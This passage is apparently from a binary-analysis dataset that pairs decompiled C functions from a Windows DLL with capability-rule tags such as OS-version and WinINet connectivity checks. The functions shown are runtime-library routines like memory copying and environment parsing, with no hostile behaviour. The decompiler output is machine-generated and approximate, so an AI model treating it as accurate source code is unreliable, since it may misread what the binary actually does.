iVar23 + -0x20;\n                uVar25 = *puVar21;\n                uVar27 = puVar21[1];\n                uVar28 = puVar21[2];\n                uVar29 = puVar21[3];\n                puVar21 = puVar18 + -0x20;\n                puVar18[-4] = *puVar19;\n                puVar18[-3] = uVar4;\n                puVar18[-2] = uVar5;\n                puVar18[-1] = uVar6;\n                puVar18[-8] = uVar25;\n                puVar18[-7] = uVar27;\n                puVar18[-6] = uVar28;\n                puVar18[-5] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x30;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x40;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                uVar24 = uVar24 - 1;\n                puVar18[-0xc] = *puVar19;\n                puVar18[-0xb] = uVar4;\n                puVar18[-10] = uVar5;\n                puVar18[-9] = uVar6;\n                puVar18[-0x10] = uVar25;\n                puVar18[-0xf] = uVar27;\n                puVar18[-0xe] = uVar28;\n                puVar18[-0xd] = uVar29;\n                puVar19 = puVar18 + iVar23 + -0x50;\n                uVar4 = puVar19[1];\n                uVar5 = puVar19[2];\n                uVar6 = puVar19[3];\n                puVar1 = puVar18 + iVar23 + -0x60;\n                uVar25 = *puVar1;\n                uVar27 = puVar1[1];\n                uVar28 = puVar1[2];\n                uVar29 = puVar1[3];\n                puVar18[-0x14] = *puVar19;\n                puVar18[-0x13] = uVar4;\n                puVar18[-0x12] = uVar5;\n                puVar18[-0x11] = uVar6;\n                puVar18[-0x18] = uVar25;\n                puVar18[-0x17] = uVar27;\n                puVar18[-0x16] = uVar28;\n                puVar18[-0x15] = uVar29;\n                puVar1 = puVar18 + iVar23 + -0x70;\n                uVar4 = puVar1[1];\n                uVar5 = puVar1[2];\n                uVar6 = puVar1[3];\n                puVar19 = puVar21 + iVar23;\n                uVar25 = *puVar19;\n                uVar27 = puVar19[1];\n                uVar28 = puVar19[2];\n                uVar29 = puVar19[3];\n                if (uVar24 == 0) break;\n                puVar18[-0x1c] = *puVar1;\n                puVar18[-0x1b] = uVar4;\n                puVar18[-0x1a] = uVar5;\n                puVar18[-0x19] = uVar6;\n                *puVar21 = uVar25;\n                puVar18[-0x1f] = uVar27;\n                puVar18[-0x1e] = uVar28;\n                puVar18[-0x1d] = uVar29;\n                puVar18 = puVar21;\n            }\n            puVar18[-0x1c] = *puVar1;\n            puVar18[-0x1b] = uVar4;\n            puVar18[-0x1a] = uVar5;\n            puVar18[-0x19] = uVar6;\n            uVar22 = uVar22 & 0x7f;\n        }\n        for (uVar24 = uVar22 >> 4; uVar24 != 0; uVar24 = uVar24 - 1) {\n            *puVar21 = uVar25;\n            puVar21[1] = uVar27;\n            puVar21[2] = uVar28;\n            puVar21[3] = uVar29;\n            puVar21 = puVar21 + -4;\n            puVar18 = puVar21 + iVar23;\n            uVar25 = *puVar18;\n            uVar27 = puVar18[1];\n            uVar28 = puVar18[2];\n            uVar29 = puVar18[3];\n        }\n        if ((uVar22 & 0xf) != 0) {\n            uVar4 = *(*arg2 + 4);\n            uVar5 = *(*arg2 + 8);\n            uVar6 = *(*arg2 + 0xc);\n            **arg1 = **arg2;\n            *(*arg1 + 4) = uVar4;\n            *(*arg1 + 8) = uVar5;\n            *(*arg1 + 0xc) = uVar6;\n        }\n        *puVar21 = uVar25;\n        puVar21[1] = uVar27;\n        puVar21[2] = uVar28;\n        puVar21[3] = uVar29;\n        return arg1;\n    }\n    if (*0x180071018 < 3) {\n        if ((arg3 < 0x801) || ((*0x180072220 & 2) == 0)) {\n            if (0x80 < arg3) {\n                iVar23 = (arg1 & 0xf) - 0x10;\n                puVar18 = arg1 - iVar23;\n                puVar21 = arg2 - iVar23;\n                arg3 = arg3 + iVar23;\n                if (0x80 < arg3) {\n                    do {\n                        uVar4 = puVar21[1];\n                        uVar5 = puVar21[2];\n                        uVar6 = puVar21[3];\n                        uVar25 = puVar21[4];\n                        uVar27 = puVar21[5];\n                        uVar28 = puVar21[6];\n                        uVar29 = puVar21[7];\n                        uVar7 = puVar21[8];\n                        uVar8 = puVar21[9];\n                        uVar9 = puVar21[10];\n                        uVar10 = puVar21[0xb];\n                        uVar11 = puVar21[0xc];\n                        uVar12 = puVar21[0xd];\n                        uVar13 = puVar21[0xe];\n                        uVar14 = puVar21[0xf];\n                        *puVar18 = *puVar21;\n                        puVar18[1] = uVar4;\n                        puVar18[2] = uVar5;\n                        puVar18[3] = uVar6;\n                        puVar18[4] = uVar25;\n                        puVar18[5] = uVar27;\n                        puVar18[6] = uVar28;\n                        puVar18[7] = uVar29;\n                        puVar18[8] = uVar7;\n                        puVar18[9] = uVar8;\n                        puVar18[10] = uVar9;\n                        puVar18[0xb] = uVar10;\n                        puVar18[0xc] = uVar11;\n                        puVar18[0xd] = uVar12;\n                        puVar18[0xe] = uVar13;\n                        puVar18[0xf] = uVar14;\n                        uVar4 = puVar21[0x11];\n                        uVar5 = puVar21[0x12];\n                        uVar6 = puVar21[0x13];\n                        uVar25 = puVar21[0x14];\n                        uVar27 = puVar21[0x15];\n                        uVar28 = puVar21[0x16];\n                        uVar29 = puVar21[0x17];\n                        uVar7 = puVar21[0x18];\n                        uVar8 = puVar21[0x19];\n                        uVar9 = puVar21[0x1a];\n                        uVar10 = puVar21[0x1b];\n                        uVar11 = puVar21[0x1c];\n                        uVar12 = puVar21[0x1d];\n                        uVar13 = puVar21[0x1e];\n                        uVar14 = puVar21[0x1f];\n                        puVar18[0x10] = puVar21[0x10];\n                        puVar18[0x11] = uVar4;\n                        puVar18[0x12] = uVar5;\n                        puVar18[0x13] = uVar6;\n                        puVar18[0x14] = uVar25;\n                        puVar18[0x15] = uVar27;\n                        puVar18[0x16] = uVar28;\n                        puVar18[0x17] = uVar29;\n                        puVar18[0x18] = uVar7;\n                        puVar18[0x19] = uVar8;\n                        puVar18[0x1a] = uVar9;\n                        puVar18[0x1b] = uVar10;\n                        puVar18[0x1c] = uVar11;\n                        puVar18[0x1d] = uVar12;\n                        puVar18[0x1e] = uVar13;\n                        puVar18[0x1f] = uVar14;\n                        puVar18 = puVar18 + 0x20;\n                        puVar21 = puVar21 + 0x20;\n                        arg3 = arg3 - 0x80;\n                    } while (0x7f < arg3);\n                }\n            }\n    // WARNING: Could not recover jumptable at 0x000180012706. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (9 cases) at 0x1800790d8\n            pauVar15 = (*(*((arg3 + 0xf >> 4) * 4 + 0x1800790d8) + 0x180000000))();\n            return pauVar15;\n        }\n    }\n    else if (((arg3 < 0x2001) || (0x180000 < arg3)) || ((*0x180072220 & 2) == 0)) {\n        auVar26 = vmovdqu_avx(*arg2);\n        auVar34 = vmovdqu_avx(*(arg2[-1] + arg3));\n        if (0x100 < arg3) {\n            iVar23 = (arg1 & 0x1f) - 0x20;\n            pauVar16 = arg1 - iVar23;\n            arg2 = arg2 - iVar23;\n            arg3 = arg3 + iVar23;\n            if (0x100 < arg3) {\n                if (0x180000 < arg3) {\n                    do {\n                        uVar22 = arg3;\n                        pauVar20 = arg2;\n                        pauVar17 = pauVar16;\n                        auVar30 = vmovdqu_avx(*pauVar20);\n                        auVar31 = vmovdqu_avx(pauVar20[1]);\n                        auVar32 = vmovdqu_avx(pauVar20[2]);\n                        auVar33 = vmovdqu_avx(pauVar20[3]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *pauVar17 = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[1] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[2] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[3] = auVar30;\n                        auVar30 = vmovdqu_avx(pauVar20[4]);\n                        auVar31 = vmovdqu_avx(pauVar20[5]);\n                        auVar32 = vmovdqu_avx(pauVar20[6]);\n                        auVar33 = vmovdqu_avx(pauVar20[7]);\n                        auVar30 = vmovntdq_avx(auVar30);\n                        pauVar17[4] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar31);\n                        pauVar17[5] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar32);\n                        pauVar17[6] = auVar30;\n                        auVar30 = vmovntdq_avx(auVar33);\n                        pauVar17[7] = auVar30;\n                        pauVar16 = pauVar17[8];\n                        arg2 = pauVar20[8];\n                        arg3 = uVar22 - 0x100;\n                    } while (0xff < uVar22 - 0x100);\n                    uVar24 = uVar22 - 0xe1 & 0xffffffffffffffe0;\n    // switch table (18 cases) at 0x1800790b4\n                    switch(uVar22) {\n                    case 0x1e1:\n                    case 0x1e2:\n                    case 0x1e3:\n                    case 0x1e4:\n                    case 0x1e5:\n                    case 0x1e6:\n                    case 0x1e7:\n                    case 0x1e8:\n                    case 0x1e9:\n                    case 0x1ea:\n                    case 0x1eb:\n                    case 0x1ec:\n                    case 0x1ed:\n                    case 0x1ee:\n                    case 0x1ef:\n                    case 0x1f0:\n                    case 0x1f1:\n                    case 0x1f2:\n                    case 499:\n                    case 500:\n                    case 0x1f5:\n                    case 0x1f6:\n                    case 0x1f7:\n                    case 0x1f8:\n                    case 0x1f9:\n                    case 0x1fa:\n                    case 0x1fb:\n                    case 0x1fc:\n                    case 0x1fd:\n                    case 0x1fe:\n                    case 0x1ff:\n                        auVar30 = vmovdqu_avx(*(*pauVar20 + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(*pauVar17 + uVar24) = auVar30;\n                    case 0x1c1:\n                    case 0x1c2:\n                    case 0x1c3:\n                    case 0x1c4:\n                    case 0x1c5:\n                    case 0x1c6:\n                    case 0x1c7:\n                    case 0x1c8:\n                    case 0x1c9:\n                    case 0x1ca:\n                    case 0x1cb:\n                    case 0x1cc:\n                    case 0x1cd:\n                    case 0x1ce:\n                    case 0x1cf:\n                    case 0x1d0:\n                    case 0x1d1:\n                    case 0x1d2:\n                    case 0x1d3:\n                    case 0x1d4:\n                    case 0x1d5:\n                    case 0x1d6:\n                    case 0x1d7:\n                    case 0x1d8:\n                    case 0x1d9:\n                    case 0x1da:\n                    case 0x1db:\n                    case 0x1dc:\n                    case 0x1dd:\n                    case 0x1de:\n                    case 0x1df:\n                    case 0x1e0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[1] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[1] + uVar24) = auVar30;\n                    case 0x1a1:\n                    case 0x1a2:\n                    case 0x1a3:\n                    case 0x1a4:\n                    case 0x1a5:\n                    case 0x1a6:\n                    case 0x1a7:\n                    case 0x1a8:\n                    case 0x1a9:\n                    case 0x1aa:\n                    case 0x1ab:\n                    case 0x1ac:\n                    case 0x1ad:\n                    case 0x1ae:\n                    case 0x1af:\n                    case 0x1b0:\n                    case 0x1b1:\n                    case 0x1b2:\n                    case 0x1b3:\n                    case 0x1b4:\n                    case 0x1b5:\n                    case 0x1b6:\n                    case 0x1b7:\n                    case 0x1b8:\n                    case 0x1b9:\n                    case 0x1ba:\n                    case 0x1bb:\n                    case 0x1bc:\n                    case 0x1bd:\n                    case 0x1be:\n                    case 0x1bf:\n                    case 0x1c0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[2] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[2] + uVar24) = auVar30;\n                    case 0x181:\n                    case 0x182:\n                    case 0x183:\n                    case 0x184:\n                    case 0x185:\n                    case 0x186:\n                    case 0x187:\n                    case 0x188:\n                    case 0x189:\n                    case 0x18a:\n                    case 0x18b:\n                    case 0x18c:\n                    case 0x18d:\n                    case 0x18e:\n                    case 399:\n                    case 400:\n                    case 0x191:\n                    case 0x192:\n                    case 0x193:\n                    case 0x194:\n                    case 0x195:\n                    case 0x196:\n                    case 0x197:\n                    case 0x198:\n                    case 0x199:\n                    case 0x19a:\n                    case 0x19b:\n                    case 0x19c:\n                    case 0x19d:\n                    case 0x19e:\n                    case 0x19f:\n                    case 0x1a0:\n                        auVar30 = vmovdqu_avx(*(pauVar20[3] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[3] + uVar24) = auVar30;\n                    case 0x161:\n                    case 0x162:\n                    case 0x163:\n                    case 0x164:\n                    case 0x165:\n                    case 0x166:\n                    case 0x167:\n                    case 0x168:\n                    case 0x169:\n                    case 0x16a:\n                    case 0x16b:\n                    case 0x16c:\n                    case 0x16d:\n                    case 0x16e:\n                    case 0x16f:\n                    case 0x170:\n                    case 0x171:\n                    case 0x172:\n                    case 0x173:\n                    case 0x174:\n                    case 0x175:\n                    case 0x176:\n                    case 0x177:\n                    case 0x178:\n                    case 0x179:\n                    case 0x17a:\n                    case 0x17b:\n                    case 0x17c:\n                    case 0x17d:\n                    case 0x17e:\n                    case 0x17f:\n                    case 0x180:\n                        auVar30 = vmovdqu_avx(*(pauVar20[4] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[4] + uVar24) = auVar30;\n                    case 0x141:\n                    case 0x142:\n                    case 0x143:\n                    case 0x144:\n                    case 0x145:\n                    case 0x146:\n                    case 0x147:\n                    case 0x148:\n                    case 0x149:\n                    case 0x14a:\n                    case 0x14b:\n                    case 0x14c:\n                    case 0x14d:\n                    case 0x14e:\n                    case 0x14f:\n                    case 0x150:\n                    case 0x151:\n                    case 0x152:\n                    case 0x153:\n                    case 0x154:\n                    case 0x155:\n                    case 0x156:\n                    case 0x157:\n                    case 0x158:\n                    case 0x159:\n                    case 0x15a:\n                    case 0x15b:\n                    case 0x15c:\n                    case 0x15d:\n                    case 0x15e:\n                    case 0x15f:\n                    case 0x160:\n                        auVar30 = vmovdqu_avx(*(pauVar20[5] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[5] + uVar24) = auVar30;\n                    case 0x121:\n                    case 0x122:\n                    case 0x123:\n                    case 0x124:\n                    case 0x125:\n                    case 0x126:\n                    case 0x127:\n                    case 0x128:\n                    case 0x129:\n                    case 0x12a:\n                    case 299:\n                    case 300:\n                    case 0x12d:\n                    case 0x12e:\n                    case 0x12f:\n                    case 0x130:\n                    case 0x131:\n                    case 0x132:\n                    case 0x133:\n                    case 0x134:\n                    case 0x135:\n                    case 0x136:\n                    case 0x137:\n                    case 0x138:\n                    case 0x139:\n                    case 0x13a:\n                    case 0x13b:\n                    case 0x13c:\n                    case 0x13d:\n                    case 0x13e:\n                    case 0x13f:\n                    case 0x140:\n                        auVar30 = vmovdqu_avx(*(pauVar20[6] + uVar24));\n                        auVar30 = vmovntdq_avx(auVar30);\n                        *(pauVar17[6] + uVar24) = auVar30;\n                    default:\n                        auVar34 = vmovdqu_avx(auVar34);\n                        *(pauVar17[-1] + uVar22) = auVar34;\n                    case 0x100:\n                        auVar26 = vmovdqu_avx(auVar26);\n                        *arg1 = auVar26;\n                        vzeroupper_avx();\n                        return pauVar15;\n                    }\n                }\n                do {\n                    auVar34 = vmovdqu_avx(*arg2);\n                    auVar30 = vmovdqu_avx(arg2[1]);\n                    auVar31 = vmovdqu_avx(arg2[2]);\n                    auVar32 = vmovdqu_avx(arg2[3]);\n                    *pauVar16 = auVar34;\n                    pauVar16[1] = auVar30;\n                    pauVar16[2] = auVar31;\n                    pauVar16[3] = auVar32;\n                    auVar34 = vmovdqu_avx(arg2[4]);\n                    auVar30 = vmovdqu_avx(arg2[5]);\n                    auVar31 = vmovdqu_avx(arg2[6]);\n                    auVar32 = vmovdqu_avx(arg2[7]);\n                    pauVar16[4] = auVar34;\n                    pauVar16[5] = auVar30;\n                    pauVar16[6] = auVar31;\n                    pauVar16[7] = auVar32;\n                    pauVar16 = pauVar16[8];\n                    arg2 = arg2[8];\n                    arg3 = arg3 - 0x100;\n                } while (0xff < arg3);\n            }\n        }\n    // WARNING: Could not recover jumptable at 0x000180012462. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (27 cases) at 0x180079090\n        pauVar15 = (*(*((arg3 + 0x1f >> 5) * 4 + 0x180079090) + 0x180000000))(SUB328(auVar26, 0));\n        return pauVar15;\n    }\n    for (; arg3 != 0; arg3 = arg3 - 1) {\n        (*arg1)[0] = (*arg2)[0];\n        arg2 = *arg2 + 1;\n        arg1 = *arg1 + 1;\n    }\n    return pauVar15;\n}\n",
        "token_count": 7520
    },
    "180014ed": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t fcn.180014ed0(int64_t *arg1)\n\n{\n    code *pcVar1;\n    int64_t iVar2;\n    uint auStackX8 [2];\n    \n    if (*arg1 == 0) {\n        auStackX8[0] = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (*(arg1 + 2) == '\\0') {\n            iVar2 = 0;\n            *(arg1 + 2) = 1;\n            arg1[1] = 0;\n        }\n        else {\n            iVar2 = arg1[1];\n        }\n        iVar2 = fcn.18003d210(auStackX8, iVar2);\n        *arg1 = iVar2;\n        (*_sym.imp.KERNEL32.dll_SetLastError)(auStackX8[0]);\n        if (iVar2 == 0) {\n            fcn.1800188ac();\n            pcVar1 = swi(3);\n            iVar2 = (*pcVar1)();\n            return iVar2;\n        }\n    }\n    return *arg1;\n}\n",
        "token_count": 233
    },
    "18001591": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.180015910(ulong arg1, ulong arg2, int64_t **arg3)\n\n{\n    int64_t iVar1;\n    uint32_t uVar2;\n    uint64_t uVar3;\n    \n    uVar3 = arg1;\n    uVar2 = 0;\n    if (arg3 == NULL) {\n        iVar1 = fcn.18003c04c();\n        if (arg1 + 1U < 0x101) {\n            uVar2 = *(iVar1 + uVar3 * 2) & arg2;\n        }\n        uVar3 = uVar2;\n    }\n    else if (arg1 + 1U < 0x101) {\n        uVar3 = *(**arg3 + uVar3 * 2) & arg2;\n    }\n    else if (*(*arg3 + 1) < 2) {\n        uVar3 = 0;\n    }\n    else {\n        uVar3 = fcn.18003c1e0(uVar3 & 0xffffffff, arg2, arg3);\n    }\n    return uVar3;\n}\n",
        "token_count": 244
    },
    "180015f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.180015f40(ulong arg1)\n\n{\n    uint uVar1;\n    int64_t iVar2;\n    ulong var_50h;\n    ulong var_48h;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_bp_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x180072760 == 0;\n    var_30h._0_1_ = 0;\n    var_bp_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_28h._0_4_ = *0x1800711e8;\n        var_28h._4_4_ = *0x1800711ec;\n        uStack40 = *0x1800711f0;\n        uStack36 = *0x1800711f4;\n    }\n    var_48h = 0;\n    var_50h = arg1;\n    uVar1 = fcn.180013488(&var_40h, &var_50h, 10);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_bp_10h != '\\0') {\n        iVar2 = fcn.180014ed0(&var_40h);\n        *(iVar2 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar2 = fcn.180014ed0(&var_40h);\n        *(iVar2 + 0x24) = var_bp_10h._4_4_;\n    }\n    return uVar1;\n}\n",
        "token_count": 468
    },
    "18001641": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.180016414(int32_t **arg1)\n\n{\n    ulong arg1_00;\n    \n    if (*0x1800723d0 != '\\0') {\n        return;\n    }\n    *0x1800723c0 = 1;\n    if (**arg1 == 0) {\n        if (*0x1800723c8 != *0x180071010) {\n            (**0x18005d3f8)(0, 0, 0);\n        }\n        arg1_00 = 0x180072720;\n    }\n    else {\n        if (**arg1 != 1) goto code_r0x00018001648e;\n        arg1_00 = 0x180072738;\n    }\n    fcn.18001840c(arg1_00);\ncode_r0x00018001648e:\n    if (**arg1 == 0) {\n        fcn.180018760(0x18005d450, 0x18005d470);\n    }\n    fcn.180018760(0x18005d478, 0x18005d480);\n    if (*arg1[1] == 0) {\n        *0x1800723d0 = '\\x01';\n        *arg1[2] = 1;\n    }\n    return;\n}\n",
        "token_count": 285
    },
    "18001676": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180016571)\n// WARNING: Removing unreachable block (ram,0x00018001657e)\n// WARNING: Removing unreachable block (ram,0x000180016588)\n// WARNING: Removing unreachable block (ram,0x000180016597)\n// WARNING: Removing unreachable block (ram,0x0001800165a2)\n// WARNING: Removing unreachable block (ram,0x0001800165ab)\n// WARNING: Removing unreachable block (ram,0x0001800165b4)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18001676c(void)\n\n{\n    code *pcVar1;\n    uint auStackX16 [2];\n    int32_t aiStackX24 [2];\n    ulong var_28h;\n    uchar var_30h [4];\n    ulong var_2ch;\n    ulong var_20h;\n    uint *var_bp_18h;\n    int32_t *var_bp_10h;\n    ulong *var_8h;\n    \n    aiStackX24[0] = 1;\n    auStackX16[0] = 0;\n    var_20h = 0xfffffffffffffffe;\n    var_28h._0_1_ = 0;\n    var_bp_18h = auStackX16;\n    var_bp_10h = aiStackX24;\n    var_8h = &var_28h;\n    var_2ch._0_4_ = 2;\n    var_2ch._4_4_ = 2;\n    fcn.180016314(var_30h, &var_2ch + 4, &var_bp_18h, &var_2ch);\n    if (aiStackX24[0] == 0) {\n        fcn.180016614(0);\n        pcVar1 = swi(3);\n        (*pcVar1)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 424
    },
    "18001761": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint64_t * fcn.180017618(char *arg1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t *arg1_00;\n    int64_t *piVar4;\n    char cVar5;\n    int64_t iVar6;\n    int64_t iVar7;\n    char *pcVar8;\n    \n    cVar5 = *arg1;\n    iVar6 = 0;\n    pcVar8 = arg1;\n    while (cVar5 != '\\0') {\n        iVar7 = iVar6 + 1;\n        if (cVar5 == '=') {\n            iVar7 = iVar6;\n        }\n        iVar6 = -1;\n        do {\n            iVar3 = iVar6;\n            iVar6 = iVar3 + 1;\n        } while (pcVar8[iVar6] != '\\0');\n        pcVar8 = pcVar8 + iVar3 + 2;\n        iVar6 = iVar7;\n        cVar5 = *pcVar8;\n    }\n    arg1_00 = fcn.18003fa94(iVar6 + 1, 8);\n    piVar4 = arg1_00;\n    if (arg1_00 == NULL) {\ncode_r0x00018001767b:\n        fcn.18003fb14(0);\n        arg1_00 = NULL;\n    }\n    else {\n        for (; *arg1 != '\\0'; arg1 = arg1 + iVar7) {\n            iVar6 = -1;\n            do {\n                iVar7 = iVar6;\n                iVar6 = iVar7 + 1;\n            } while (arg1[iVar6] != '\\0');\n            iVar7 = iVar7 + 2;\n            if (*arg1 != '=') {\n                iVar6 = fcn.18003fa94(iVar7, 1);\n                if (iVar6 == 0) {\n                    fcn.180017844(arg1_00);\n                    fcn.18003fb14(0);\n                    goto code_r0x00018001767b;\n                }\n                iVar2 = fcn.180018970(iVar6, iVar7, arg1);\n                if (iVar2 != 0) {\n                    fcn.18003bfa8(0, 0, 0, 0, 0);\n                    pcVar1 = swi(3);\n                    piVar4 = (*pcVar1)();\n                    return piVar4;\n                }\n                *piVar4 = iVar6;\n                piVar4 = piVar4 + 1;\n                fcn.18003fb14(0);\n            }\n        }\n        fcn.18003fb14(0);\n    }\n    return arg1_00;\n}\n",
        "token_count": 585
    },
    "1800186e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nulong fcn.1800186e0(void)\n\n{\n    char cVar1;\n    ulong uVar2;\n    int64_t *piVar3;\n    bool bVar4;\n    \n    piVar3 = 0x18005f0d0;\n    do {\n        if ((*piVar3 != 0) && (cVar1 = (**0x18005d3f8)(),  cVar1 == '\\0')) break;\n        piVar3 = piVar3 + 2;\n    } while (piVar3 != 0x18005f1d0);\n    if (piVar3 == 0x18005f1d0) {\n        uVar2 = 1;\n    }\n    else {\n        if (piVar3 != 0x18005f0d0) {\n            piVar3 = piVar3 + -1;\n            do {\n                if ((piVar3[-1] != 0) && (*piVar3 != 0)) {\n                    (**0x18005d3f8)(0);\n                }\n                bVar4 = piVar3 != 0x18005f0d8;\n                piVar3 = piVar3 + -2;\n            } while (bVar4);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 286
    },
    "18003b78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.18003b784(ulong arg1, ulong arg2, ulong ***arg3, ulong arg4)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint32_t in_stack_00000028;\n    uint32_t in_stack_00000030;\n    ulong in_stack_00000040;\n    int32_t in_stack_00000048;\n    uchar auStack264 [32];\n    uchar *puStack232;\n    ulong ***pppuStack224;\n    ulong uStack216;\n    ulong ***pppuStack200;\n    ulong uStack192;\n    uchar auStack184 [48];\n    ulong uStack136;\n    uint32_t uStack120;\n    uint64_t uStack72;\n    \n    uStack72 = *0x180071010 ^ auStack264;\n    uStack192 = fcn.18004a6e0(0x1f80, 0xffc0);\n    pppuStack200 = arg3;\n    iVar2 = fcn.18003b6c8(in_stack_00000028, uStack192);\n    uVar3 = in_stack_00000040;\n    uVar4 = in_stack_00000040 >> 0x20;\n    if (iVar2 == 0) {\n        if (in_stack_00000048 == 2) {\n            uStack136 = in_stack_00000040;\n            uStack120 = uStack120 & 0xffffffe3 | 3;\n        }\n        pppuStack224 = &pppuStack200;\n        puStack232 = &stack0x00000038;\n        fcn.18004a25c(auStack184, &uStack192, in_stack_00000028, arg2);\n    }\n    cVar1 = fcn.1800464b4();\n    if ((cVar1 == '\\0') || (arg4 == 0)) {\n        fcn.18004a5c0(arg4);\n        fcn.18004a6e0(uStack192, 0xffc0);\n    }\n    else {\n        uStack216 = uStack192;\n        pppuStack224 = pppuStack200;\n        puStack232 = CONCAT44(uVar4, uVar3);\n        fcn.18003b660(arg4, in_stack_00000030, arg1);\n    }\n    fcn.180002200(uStack72 ^ auStack264);\n    return;\n}\n",
        "token_count": 538
    },
    "18003bde": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003bdec(ulong noname_0, ulong noname_1, ulong noname_2, ulong noname_3, ulong arg_30h)\n\n{\n    int64_t iVar1;\n    int64_t var_40h;\n    ulong var_30h;\n    ulong var_bp_28h;\n    uint uStack40;\n    uint uStack36;\n    ulong var_18h;\n    ulong var_10h;\n    ulong var_bp_8h;\n    \n    var_40h = 0;\n    var_18h._0_1_ = *0x180072760 == 0;\n    var_30h._0_1_ = 0;\n    var_10h._0_1_ = '\\0';\n    var_bp_8h._0_1_ = '\\0';\n    if (var_18h) {\n        var_bp_28h._0_4_ = *0x1800711e8;\n        var_bp_28h._4_4_ = *0x1800711ec;\n        uStack40 = *0x1800711f0;\n        uStack36 = *0x1800711f4;\n    }\n    fcn.18003be88(noname_0, noname_1, noname_2, noname_3);\n    if (var_18h == '\\x02') {\n        *(var_40h + 0x3a8) = *(var_40h + 0x3a8) & 0xfffffffd;\n    }\n    if (var_10h != '\\0') {\n        iVar1 = fcn.180014ed0(&var_40h);\n        *(iVar1 + 0x20) = var_18h._4_4_;\n    }\n    if (var_bp_8h != '\\0') {\n        iVar1 = fcn.180014ed0(&var_40h);\n        *(iVar1 + 0x24) = var_10h._4_4_;\n    }\n    return;\n}\n",
